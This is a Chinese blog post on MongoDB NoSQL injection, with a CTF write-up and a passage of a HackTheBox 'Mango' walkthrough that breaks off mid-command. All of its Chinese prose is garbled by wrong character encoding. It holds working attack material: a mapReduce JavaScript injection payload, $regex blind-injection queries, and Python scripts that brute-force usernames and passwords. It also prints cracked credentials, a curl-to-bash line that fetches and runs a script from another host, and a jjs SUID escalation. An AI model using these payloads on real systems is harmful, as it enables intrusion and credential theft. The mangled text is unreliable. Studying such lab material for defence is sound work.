MongoDBä¸­çš„mapReduceå‡½æ•°æœ‰ç‚¹ç±»ä¼¼äºMySQLä¸­çš„group byæ“ä½œï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå®˜æ–¹æ–‡æ¡£çš„ä¾‹å­ï¼Œåœ¨é›†åˆ orders ä¸­æŸ¥æ‰¾ status:â€œAâ€ çš„æ•°æ®ï¼Œå¹¶æ ¹æ® cust_id æ¥åˆ†ç»„ï¼Œå¹¶è®¡ç®— amount çš„æ€»å’Œï¼š ç®€å•çš„è§£é‡Šä¸€ä¸‹ï¼š mapå‡½æ•°ç”¨äºåˆ†ç»„ï¼š 1function map()&#123; emit(param1, param2); &#125; param1ï¼šéœ€è¦åˆ†ç»„çš„å­—æ®µï¼Œthis.å­—æ®µåï¼› param2ï¼šéœ€è¦è¿›è¡Œç»Ÿè®¡çš„å­—æ®µï¼Œthis.å­—æ®µåã€‚ reduceå‡½æ•°ç”¨äºå¤„ç†éœ€è¦ç»Ÿè®¡çš„å­—æ®µï¼š 1function reduce(key, values)&#123; // ç»Ÿè®¡å­—æ®µå¤„ç† &#125; keyï¼š æŒ‡åˆ†ç»„å­—æ®µï¼ˆemitçš„param1ï¼‰å¯¹åº”çš„å€¼ï¼› valuesï¼šæŒ‡éœ€è¦ç»Ÿè®¡çš„å­—æ®µï¼ˆemitçš„param2ï¼‰å€¼ç»„æˆçš„æ•°ç»„ã€‚ Mapå‡½æ•°å’ŒReduceå‡½æ•°å¯ä»¥ä½¿ç”¨ JavaScript æ¥å®ç°ï¼Œä½¿å¾—MapReduceçš„ä½¿ç”¨éå¸¸çµæ´»å’Œå¼ºå¤§ã€‚ä½†æ˜¯åŒæ ·ä¹Ÿå¸¦æ¥äº†éšæ‚£ï¼Œå‡è®¾æœ‰è¿™æ ·çš„ä¸€ä¸ªä¸šåŠ¡åœºæ™¯ï¼Œæ•°æ®åº“ä¸­å­˜å‚¨äº†ä¸€ä¸ªstoreé›†åˆï¼Œæœ‰ä¸€ç³»åˆ—å•†å“çš„åç§°ã€ä»·æ ¼å’Œæ•°é‡ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°ç›¸åŒå•†å“çš„ä»·æ ¼æˆ–è€…æ•°é‡çš„æ€»å’Œï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112require_once __DIR__ &quot;/vendor/autoload.php&quot;;$param = $_POST[&#x27;param&#x27;];$collection = (new MongoDB\\Client)-&gt;test-&gt;stores;$map = &quot;function() &#123; for (var i = 0; i &lt; this.items.length; i++) &#123; emit(this.name, this.items[i].$param); &#125; &#125;&quot;;$reduce = &quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;;$opt = &quot;&#123; out: &#x27;totals&#x27; &#125;&quot;;$results = $collection-&gt;mapReduce($map, $reduce, $out); è¯¥ä»£ç åº”è¯¥åœ¨$paramç»™å®šçš„å­—æ®µä¸Šæ±‚å’Œï¼Œä½†æ˜¯è¿™åŒæ ·ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œå¦‚æœ$paramæ˜¯è¿™æ ·ï¼š 123a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: â€˜xâ€™ &#125;);db.injection.insert(&#123;success:1&#125;); return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1 é‚£ä¹ˆåœ¨MongoDBä¸­å°±ç›¸å½“äºæ‰§è¡Œäº†ä¸‹é¢è¿™æ¡è¯­å¥ï¼š 12345678910db.stores.mapReduce(function() &#123; for (var i&#x3D;0; i &lt; this.items.length; i++) &#123;emit(this.name, this.items[i].a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: &#39;x&#39; &#125;);db.injection.insert(&#123;success:1&#125;); return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1); &#125; &#125;,function(name, sum) &#123;return Array.sum(sum); &#125;, &#123; out: &#39;totals&#39; &#125;);&quot; ç›¸å½“äºç›´æ¥æ§åˆ¶äº†æ•´ä¸ªMongoDBçš„æ“ä½œã€‚ ä½†æˆ‘ä»¬ä¹ŸåŒæ—¶å‘ç°ï¼Œæ„å»ºè¿™æ ·çš„payloadæ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œéœ€è¦æˆ‘ä»¬å¯¹MongoDBï¼ŒJavaScriptå’Œä¸šåŠ¡éƒ½æœ‰è¶³å¤Ÿçš„äº†è§£ï¼Œè¿™ä¹Ÿæ˜¯NoSQLæ³¨å…¥çš„å±€é™æ€§ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¾‹å­ä¹Ÿå‘Šè¯‰æˆ‘ä»¬æœ‰ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹å°±æœ‰å±é™©å­˜åœ¨ï¼Œæ¯”å¦‚åé¢æœ‰ä¸€ä¸ªCTFé¢˜ï¼Œç”¨çš„ä¹Ÿæ˜¯MongoDBä¸­çš„èšåˆå‡½æ•°aggregateï¼Œä½†æ˜¯å› ä¸ºä¸€ä¸ªGETå‚æ•°è€Œå­˜åœ¨æ³¨å…¥æ¼æ´ã€‚ ç›²æ³¨ å›æƒ³ä¸€æƒ³ä¸Šé¢çš„ä¾‹å­ï¼Œå‡å¦‚é¡µé¢åªæ˜¯å‘Šè¯‰ä½ æˆåŠŸæˆ–è€…å¤±è´¥ï¼Œé‚£ä¹ˆå°±æ˜¯æˆ‘ä»¬åœ¨ MySQL é‡Œé‡åˆ°çš„å¸ƒå°”ç›²æ³¨äº†ã€‚å¸ƒå°”ç›²æ³¨é‡ç‚¹åœ¨äºæ€ä¹ˆé€ä¸ªæå–å­—ç¬¦ï¼ŒMySQL é‡Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨substrï¼Œè€Œåœ¨ MongoDB é‡Œæˆ‘ä»¬æœ‰ $regexã€‚ å·²çŸ¥æŸä¸€ä¸ªç”¨æˆ·åçš„å‰æä¸‹åˆ¤æ–­çš„å¯†ç é•¿åº¦ï¼š 1?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;.&#123;5&#125; é€ä½æå–å­—ç¬¦ï¼š 123456789101112# urlæ ¼å¼?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.&#123;4&#125;?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.&#123;3&#125;?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca0.&#123;2&#125;?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.*?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.*# jsonæ ¼å¼&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125; å½“ç„¶ï¼Œæåˆ°ç›²æ³¨è‚¯å®šå°‘ä¸äº†è„šæœ¬ï¼š 123456789101112131415161718import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()username = &#x27;admin&#x27;password = &#x27;&#x27;target = &#x27;http://127.0.0.1/mongo/test.php&#x27;while True: for c in string.printable: if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]: payload = &#x27;?username=%s&amp;password[$regex]=^%s&#x27; % (username, password + c) r = requests.get(target + payload) if &#x27;OK&#x27; in r.text: print(&quot;Found one more char : %s&quot; % (password+c)) password += c çˆ†ç ´å¯†ç ç»“æœå¦‚ä¸‹ï¼š ç±»ä¼¼çš„è¿˜æœ‰POSTçš„ç‰ˆæœ¬ï¼š 12345678910111213141516171819import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()username=&quot;admin&quot;password=&quot;&quot;target = &#x27;http://127.0.0.1/mongo/test.php&#x27;headers = &#123;&#x27;content-type&#x27;: &#x27;application/json&#x27;&#125;while True: for c in string.printable: if c not in [&#x27;*&#x27;,&#x27;+&#x27;,&#x27;.&#x27;,&#x27;?&#x27;,&#x27;|&#x27;]: payload = &#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27; % (username, password + c) r = requests.post(target, data = payload, headers = headers, verify = False, allow_redirects = False) if &#x27;OK&#x27; in r.text or r.status_code == 302: print(&quot;Found one more char : %s&quot; % (password+c)) password += c å½“ç„¶è¿™é‡Œçš„è„šæœ¬è¿˜æ˜¯æœ‰ä¸€äº›æ”¹è¿›çš„åœ°æ–¹ï¼Œæ¯”å¦‚å¯ä»¥é¦–å…ˆåˆ¤æ–­ç”¨æˆ·åæˆ–å¯†ç é•¿åº¦ï¼Œè€Œä¸”ä¸Šé¢ä»£ç å»æ‰äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ç­‰ç­‰çš„ã€‚è¿™é‡Œå°±ä¸å†å¤šåšæ¼”ç¤ºäº†ï¼Œåˆšå¥½ä¸‹é¢æœ‰ä¸€ä¸ªå®ä¾‹é¶æœºæ˜¯éœ€è¦å†™Pythonè„šæœ¬ç›²æ³¨MongoDBï¼Œé‚£ä¸ªä»£ç è€ƒè™‘çš„é—®é¢˜æ›´å¤šï¼Œå¯ä»¥ç¨å¾®çœ‹ä¸€ä¸‹ã€‚ 0x04 Node.JS MongoDBæ³¨å…¥ æŠ€å·§è·ŸPHP MongoDBæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œå°±æä¾›ä¸€äº›Node.JSçš„é¶åœºç»™å¤§å®¶ç»ƒç»ƒæ‰‹ï¼š https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035 https://github.com/ricardojoserf/NoSQL-injection-example 0x05 MongoDB æ³¨å…¥å®ä¾‹ CTF NopeSQL é¶æœºåœ°å€ï¼šhttps://cybrics.net/tasks/nopesql æ‰«æç½‘ç«™å‘ç°æœ‰Gitæºç æ³„éœ²ï¼Œç”¨GitHackå·¥å…·è·å¾—index.phpæºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phprequire_once __DIR__ . &quot;&#x2F;vendor&#x2F;autoload.php&quot;;function auth($username, $password) &#123; $collection &#x3D; (new MongoDB\\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;users; $raw_query &#x3D; &#39;&#123;&quot;username&quot;: &quot;&#39;.$username.&#39;&quot;, &quot;password&quot;: &quot;&#39;.$password.&#39;&quot;&#125;&#39;; $document &#x3D; $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125;$user &#x3D; false;if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; isset($_COOKIE[&#39;password&#39;])) &#123; $user &#x3D; auth($_COOKIE[&#39;username&#39;], $_COOKIE[&#39;password&#39;]);&#125;if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123; $user &#x3D; auth($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]); if ($user) &#123; setcookie(&#39;username&#39;, $_POST[&#39;username&#39;]); setcookie(&#39;password&#39;, $_POST[&#39;password&#39;]); &#125;&#125;?&gt;&lt;?php if ($user &#x3D;&#x3D; true): ?&gt; Welcome! &lt;div&gt; Group most common news by &lt;a href&#x3D;&quot;?filter&#x3D;$category&quot;&gt;category&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;?filter&#x3D;$public&quot;&gt;publicity&lt;&#x2F;a&gt;&lt;br&gt; &lt;&#x2F;div&gt; &lt;?php $filter &#x3D; $_GET[&#39;filter&#39;]; $collection &#x3D; (new MongoDB\\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news; $pipeline &#x3D; [ [&#39;$group&#39; &#x3D;&gt; [&#39;_id&#39; &#x3D;&gt; &#39;$category&#39;, &#39;count&#39; &#x3D;&gt; [&#39;$sum&#39; &#x3D;&gt; 1]]], [&#39;$sort&#39; &#x3D;&gt; [&#39;count&#39; &#x3D;&gt; -1]], [&#39;$limit&#39; &#x3D;&gt; 5], ]; $filters &#x3D; [ [&#39;$project&#39; &#x3D;&gt; [&#39;category&#39; &#x3D;&gt; $filter]] ]; $cursor &#x3D; $collection-&gt;aggregate(array_merge($filters, $pipeline)); ?&gt; &lt;?php if (isset($filter)): ?&gt; &lt;?php foreach ($cursor as $category) &#123; printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&#39;_id&#39;], $category[&#39;count&#39;]); &#125; ?&gt; &lt;?php endif; ?&gt;&lt;?php else: ?&gt; &lt;?php if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])): ?&gt; Invalid username or password &lt;?php endif; ?&gt; &lt;form action&#x3D;&#39;&#x2F;&#39; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;h2&gt;News&lt;&#x2F;h2&gt; &lt;?php $collection &#x3D; (new MongoDB\\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news; $cursor &#x3D; $collection-&gt;find([&#39;public&#39; &#x3D;&gt; 1]); foreach ($cursor as $news) &#123; printf(&quot;%s&lt;br&gt;&quot;, $news[&#39;title&#39;]); &#125; ?&gt;&lt;?php endif; ?&gt; ç¬¬ä¸€æ­¥æ˜¯åˆ©ç”¨é‡è¨€å¼æ³¨å…¥ç™»å½•ï¼Œä½†æ˜¯æœ‰ç‚¹ä¸åŒçš„æ˜¯ï¼Œè¾“å…¥çš„å‚æ•°è¢«åŒå¼•å·åŒ…æ‹¬ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•é—­åˆè¿™ä¸ªåŒå¼•å·ï¼Œpayloadï¼š 1username&#x3D;1&amp;password&#x3D;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;&#x3D;null&#125;, &quot;username&quot;:admin&quot; è¿™é‡Œå¦‚æœç›´æ¥ä½¿ç”¨&#123;&quot;$ne&quot;:null&#125;ä¼šå‡ºç°500çš„é”™è¯¯ï¼š 12345678910ä»£ç ï¼švar_dump(json_decode($raw_query));è¾“å‡º:object(stdClass)#1 (2) &#123; [&quot;username&quot;]&#x3D;&gt; string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot; [&quot;password&quot;]&#x3D;&gt; string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;&#125; å‘ç°&#123;'$ne':null&#125;è¢«è§£ææˆäº†stringè€Œä¸æ˜¯arrayã€‚å‰ä¸€ä¸ªpayloadè™½ç„¶usernameå’Œpasswordé‡å¤äº†ï¼Œä½†json_decodeæ—¶å˜é‡åªä¼šæ˜¯æœ€åä¸€æ¬¡çš„èµ‹å€¼ã€‚ ç™»å½•æˆåŠŸå filterå‚æ•°é‡Œå¯ä»¥å¡« categoryå±•ç¤ºç›®å½• textå±•ç¤ºå†…å®¹ titleå±•ç¤ºæ ‡é¢˜ï¼Œä½†æ˜¯éƒ½é™åˆ¶äº†5æ¡ã€‚ ä»£ç é‡Œæ˜¯ç”¨çš„MongoDBèšåˆå‡½æ•°aggregateï¼Œä¸‹é¢è¿™å¼ å›¾ä¹Ÿæ˜¯æ¥è‡ªå®˜æ–¹æ–‡æ¡£è§£é‡Šäº†aggregateå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼š ä½¿ç”¨aggregateèšåˆå‡½æ•°æ—¶ï¼Œåœ¨é‡Œé¢æ˜¯å¯ä»¥ä½¿ç”¨æ¡ä»¶åˆ¤æ–­è¯­å¥çš„ã€‚åœ¨MongoDBä¸­$condè¡¨ç¤ºifåˆ¤æ–­è¯­å¥ï¼ŒåŒ¹é…çš„ç¬¦å·ä½¿ç”¨$eqï¼Œè¿èµ·æ¥ä¸º[$cond][if][$eq]ï¼Œå½“ä½¿ç”¨å¤šä¸ªåˆ¤æ–­æ¡ä»¶æ—¶é‡å¤è¯¥è¯­å¥å³å¯ã€‚ å®˜æ–¹æ–‡æ¡£åˆ—å‡ºçš„$condçš„ç”¨æ³•ï¼š å®˜æ–¹æ–‡æ¡£çš„ä¾‹å­ï¼š 1234567891011121314db.inventory.aggregate( [ &#123; $project: &#123; item: 1, discount: &#123; $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125; &#125; &#125; &#125; ]) ç°åœ¨æˆ‘ä»¬çš„ç›®çš„æ˜¯ï¼šå¦‚æœ$categoryçš„å€¼æ˜¯flagï¼Œé‚£ä¹ˆå°±è¾“å‡º$titleçš„å†…å®¹ï¼Œå¦åˆ™è¿˜æ˜¯åŸæ ·è¾“å‡º$catagoryï¼Œç…§ç€ä¸Šé¢çš„ä¾‹å­å†™æˆMongoDB shellçš„å½¢å¼å°±æ˜¯ï¼š 12345678910111213db.news.aggregate( [ &#123; $project: &#123; category: &#123; $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, then: $title, else: $category &#125; &#125; &#125; &#125; ]) è½¬æ¢æˆPHPæ•°ç»„å½¢å¼ä¼ å…¥filterå‚æ•°ï¼š 1?filter[$cond][if][$eq][]&#x3D;flags&amp;filter[$cond][if][$eq][]&#x3D;$category&amp;filter[$cond][then]&#x3D;$title&amp;filter[$cond][else]&#x3D;$category è½¬æ¢æˆraw_queryçš„å½¢å¼ï¼š 1234567891011121314&#123; &quot;category&quot;: &#123; &quot;$cond&quot;: &#123; &quot;if&quot;: &#123; &quot;$eq&quot;: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, &quot;then&quot;: &quot;$title&quot;, &quot;else&quot;: &quot;$category&quot; &#125; &#125;&#125; var_dump(json_decode(raw_query))å³ä¸ºï¼š 12345678910111213141516171819202122object(stdClass)#4 (1) &#123; [&quot;category&quot;]&#x3D;&gt; object(stdClass)#3 (1) &#123; [&quot;$cond&quot;]&#x3D;&gt; object(stdClass)#2 (3) &#123; [&quot;if&quot;]&#x3D;&gt; object(stdClass)#1 (1) &#123; [&quot;$eq&quot;]&#x3D;&gt; array(2) &#123; [0]&#x3D;&gt; string(9) &quot;$category&quot; [1]&#x3D;&gt; string(5) &quot;flags&quot; &#125; &#125; [&quot;then&quot;]&#x3D;&gt; string(6) &quot;$title&quot; [&quot;else&quot;]&#x3D;&gt; string(9) &quot;$category&quot; &#125; &#125;&#125; æ¥ç€ç›´æ¥ä¿®æ”¹$titleä¸º$textæŸ¥çœ‹ï¼š æˆåŠŸæ‹¿åˆ°flag~ HTB Mongo æœ€è¿‘åšäº†ä¸€ä¸ªHackTheBoxçš„é¶æœºï¼Œä¸»è¦è€ƒå¯Ÿçš„å°±æ˜¯å†™è„šæœ¬ç›²æ³¨MongoDBï¼Œé™äºç¯‡å¹…åŸå› ï¼Œå°±ä¸æŠŠwalkthroughè´´åœ¨è¿™é‡Œäº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥ç§»æ­¥äºæ­¤ã€‚ 0x06 å·¥å…· Githubä¸Šæœ‰ä¸ªå«NoSQLAttackå·¥å…·ï¼Œä¸è¿‡å·²ç»æ²¡æœ‰ç»´æŠ¤äº†ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªNoSQLMapå·¥å…·ï¼Œè¿™ä¸ªé¡¹ç›®ä½œè€…ä»åœ¨ç»´æŠ¤ã€‚ 0x07 å‚è€ƒèµ„æ–™ https://www.runoob.com/mongodb/ https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0 https://www.mi1k7ea.com/2019/08/11/NoSQLæ³¨å…¥ä¹‹MongoDB/#0x03-NoSQLæ³¨å…¥ https://www.tr0y.wang/2019/04/21/MongoDBæ³¨å…¥æŒ‡åŒ—/index.html https://nullsweep.com/a-nosql-injection-primer-with-mongo/ https://zanon.io/posts/nosql-injection-in-mongodb","tags":[{"name":"Webå®‰å…¨å­¦ä¹ ","slug":"Webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"NoSQLæ³¨å…¥","slug":"NoSQLæ³¨å…¥","permalink":"http://ca0y1h.top/tags/NoSQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Mongo Walkthrough","date":"2020-03-17T14:02:06.000Z","path":"Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/","text":"HTB::Mongo Walkthrough 0x01 Information 0x02 Tools and Tips Nmap LinEnum.sh gtfobins MongoDBæ³¨å…¥ 0x03 Pentesting Nmapæ‰«æé¶æœºç«¯å£ 123456789101112131415161718192021222324252627kali@kali ~ % nmap -A -Pn -T4 -p- 10.10.10.162Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-11 02:44 UTCNmap scan report for 10.10.10.162Host is up (0.060s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)| 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)|_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: 403 Forbidden443&#x2F;tcp open ssl&#x2F;http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Mango | Search Base| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN| Not valid before: 2019-09-27T14:21:19|_Not valid after: 2020-09-26T14:21:19|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http&#x2F;1.1Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 44.12 seconds ä¸»è¦æ¥çœ‹443ç«¯å£ï¼Œç”¨httpsè®¿é—®ï¼š è¿™ä¸ªé¡µé¢å¥½åƒé™¤äº†Analyticsä¹‹å¤–å…¶ä»–éƒ½æ˜¯æ‘†è®¾ ç ”ç©¶äº†ä¼šå‘ç°è¿™ä¸ªAnalyticsä¹Ÿæ˜¯ä¸€ä¸ªæ‘†è®¾ï¼Œorzã€‚ã€‚ã€‚å›å»å†çœ‹çœ‹nmapæ‰«æå‡ºæ¥çš„ç«¯å£åˆå‘ç°äº†ä¸€ä¸ªä¿¡æ¯ 12ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango PrvLtd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN commonName: å…¬ç”¨åç§°ï¼Œä¸€èˆ¬ä¸ºç½‘ç«™åŸŸå ç¼–è¾‘/etc/hostsæ–‡ä»¶æ·»åŠ è§£æï¼š 110.10.10.162 staging-order.mango.htb çœ‹åˆ°äº†ä¸€ä¸ªç™»å½•ç•Œé¢ å¥½å§ï¼Œè¿™é‡Œæœ‰ç‚¹å‘ï¼Œæ˜¯åŸºäºMongoDBçš„NoSQLæ³¨å…¥ï¼Œè¯•ä¸€ä¸‹è¿™é‡Œçš„Payloadï¼šhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection æ³¨å…¥æˆåŠŸåæ˜¯è¿™ç§ç•Œé¢ï¼š æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œç°åœ¨å›è¿‡å¤´å»çˆ†ç ´ç”¨æˆ·å’Œå¯†ç ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import stringimport requestsurl = &quot;http://staging-order.mango.htb/index.php&quot;headers = &#123;&quot;Host&quot;: &quot;staging-order.mango.htb&quot;&#125;possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\\\&quot; + c for c in string.punctuation]def main(): usernames = get_users() if usernames: print(&#x27;Finished!&#x27;) for username in usernames: password = get_password(username) print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(username, password)) else: print(&#x27;Not Found!&#x27;)def get_users(): usernames = [] payload = &#123;&quot;username[$regex]&quot;:&quot;&quot;,&quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;:&quot;login&quot;&#125; for c in possible_chars: username = &quot;^&quot; + c payload[&quot;username[$regex]&quot;] = username + &quot;.*&quot; r = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: print(&quot;username start with character:&quot; + c) for x in range(0, get_username_length() - 1): for c2 in possible_chars: payload[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot; r2 = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r2.status_code == 302: username += c2 print(username[1:]) break #if c2 == possible_chars[-1]: print(&quot;Found username: &#123;&#125;&quot;.format(username[1:])) usernames.append(username[1:]) return usernamesdef get_password(username): payload = &#123;&quot;username&quot;: username, &quot;password[$regex]&quot;: &quot;&quot;, &quot;login&quot;: &quot;login&quot;&#125; password = &quot;^&quot; for x in range(0, get_pass_length(username)): for c in possible_chars: payload[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot; r = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: password += c print(password[1:]) break password = password[1:].replace(&quot;\\\\&quot;, &quot;&quot;) print(&quot;Found &#123;&#125;&#x27;s password: &quot;.format(username) + password) return passworddef get_username_length(): length = 1 while True: payload = &#123;&quot;username[$regex]&quot;: &quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;.format(length), &quot;password[$ne]&quot;:&quot;&quot;, &quot;login&quot;:&quot;login&quot;&#125; r =requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: length += 1 else: return length -1def get_pass_length(username): length = 1 while True: payload = &#123;&quot;username&quot;: username, &quot;password[$regex]&quot;: &quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;.format(length), &quot;login&quot;: &quot;login&quot;&#125; r = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: length += 1 else: return length -1if __name__ == &#x27;__main__&#x27;: main() è¿è¡Œç»“æœå¦‚ä¸‹ï¼š å¾—åˆ°ä¸¤ä¸ªè´¦æˆ·å’Œå¯†ç ï¼š 12mango:h3mXK8RhU~f&#123;]f5Hadmin:t9KcS3&gt;!0B#2 ç™»å½•mongoè´¦æˆ· 123456789101112131415161718root@kali:~&#x2F;HTB&#x2F;Boxes&#x2F;Mango# ssh mango@10.10.10.162mango@10.10.10.162&#39;s password:&lt;...&gt;Last login: Mon Nov 11 20:58:31 2019 from 10.10.14.7mango@mango:~$ su adminPassword:$ whoamiadmin$ cd &#x2F;home&#x2F;admin$ ls -latotal 24drwxr-xr-x 2 admin admin 4096 Sep 30 03:20 .drwxr-xr-x 4 root root 4096 Sep 27 14:02 ..lrwxrwxrwx 1 admin admin 9 Sep 27 14:30 .bash_history -&gt; &#x2F;dev&#x2F;null-rw-r--r-- 1 admin admin 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 admin admin 3771 Apr 4 2018 .bashrc-rw-r--r-- 1 admin admin 807 Apr 4 2018 .profile-r-------- 1 admin admin 33 Sep 27 14:29 user.txt è·‘ä¸€ä¸ªLinEnum.shææƒè„šæœ¬çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ 123456admin@mango:&#x2F;home&#x2F;admin$ curl 10.10.14.42:80&#x2F;LinEnum.sh | bash&lt;...&gt;[-] SGID files:&lt;...&gt;-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-11-openjdkamd64&#x2F;bin&#x2F;jjs ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼šfind / -user root -perm -4000 2&gt;/dev/null æŸ¥çœ‹åˆ©ç”¨æ–¹å¼ï¼šhttps://gtfobins.github.io/gtfobins/jjs/ 1234567admin@mango:&#x2F;home&#x2F;admin$ jjsWarning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var 